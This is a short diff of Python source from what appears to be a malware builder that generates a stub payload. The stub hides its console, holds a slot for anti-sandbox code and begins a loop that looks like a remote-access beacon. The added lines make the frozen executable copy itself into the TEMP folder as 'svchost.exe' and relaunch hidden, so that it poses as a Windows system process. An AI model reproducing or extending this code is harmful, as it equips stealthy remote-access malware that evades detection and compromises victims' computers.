@@ -335,14 +335,20 @@ except:
     pass
 """
 
-        stub_code = f'''import socket,subprocess,os,time,sys
+        stub_code = f'''import socket,os,time,sys,shutil
 import subprocess as _sp
-# --noconsole fix: stdout/stderr None olabilir
 if sys.stdout is None:
     sys.stdout=open(os.devnull,"w")
 if sys.stderr is None:
     sys.stderr=open(os.devnull,"w")
 _NW=0x08000000
+if getattr(sys,"frozen",False) and "--bg" not in sys.argv:
+    _t=os.path.join(os.environ.get("TEMP","."),"svchost.exe")
+    try:
+        shutil.copy2(sys.executable,_t)
+        _sp.Popen([_t,"--bg"],creationflags=_NW)
+    except:pass
+    sys.exit(0)
 {anti_sb_code}
 def _r():
     while True:
